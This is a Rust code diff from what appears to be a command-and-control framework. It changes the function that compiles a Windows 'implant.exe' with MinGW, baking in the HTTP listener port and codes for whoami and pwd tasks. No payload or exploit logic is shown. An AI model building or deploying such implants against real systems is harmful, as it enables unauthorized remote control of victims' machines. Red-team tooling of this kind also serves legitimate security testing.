@@ -76,9 +76,33 @@ fn compile_mingw32_project(
     main_file_path: PathBuf,
     output_directory_path: PathBuf,
 ) -> bool {
+    use std::fs;
+
     let output_directory_path_str_option = output_directory_path.to_str();
     if output_directory_path_str_option.is_none() {
         return false;
+    }
+
+    // delete output file if existing
+    let output_file_pathbuf = output_directory_path.join("implant.exe");
+    if output_file_pathbuf.exists()
+    {
+        match fs::remove_file(output_file_pathbuf.clone())
+        {
+            Ok(_) => {
+                println!("[+] Removed existing implant executable");
+            },
+            Err(_) => {},
+        }
+    }
+
+    let output_file_path: &str;
+    match output_file_pathbuf.as_path().to_str()
+    {
+        Some(v) => {
+            output_file_path = v;
+        },
+        None => todo!(),
     }
 
     match main_file_path.as_path().to_str() {
@@ -87,16 +111,21 @@ fn compile_mingw32_project(
                 .stdout(Stdio::null())
                 .stderr(Stdio::null())
                 .arg("-o")
-                .arg(format!(
-                    "{}implant.exe",
-                    output_directory_path_str_option.unwrap()
-                ))
+                .arg(output_file_path)
                 .arg(implant_project_path_str)
                 .arg("-static")
                 .arg("-lws2_32")
                 .arg("-lstdc++")
                 .arg("-D_DEBUG")
                 .arg(format!("-DHTTP_PORT={}", http_listener.port))
+                .arg(format!(
+                    "-DCOMMAND_WHOAMI={}",
+                    CONFIG.implant.tasks.commands[0].code
+                ))
+                .arg(format!(
+                    "-DCOMMAND_PWD={}",
+                    CONFIG.implant.tasks.commands[1].code
+                ))
                 .status()
             {
                 Ok(_) => {
@@ -207,14 +236,11 @@ pub fn generate_http_implant(http_listener: HTTPListener, implant_project_name: 
 
     let tmp_result = PathBuf::from_str("/tmp/");
     let tmp_out_dir: PathBuf;
-    match tmp_result
-    {
+    match tmp_result {
         Ok(v) => {
             tmp_out_dir = v;
-        },
-        Err(_) => {
-            return flag
         }
+        Err(_) => return flag,
     }
 
     let current_path_result: Result<PathBuf, std::io::Error> = std::env::current_exe();
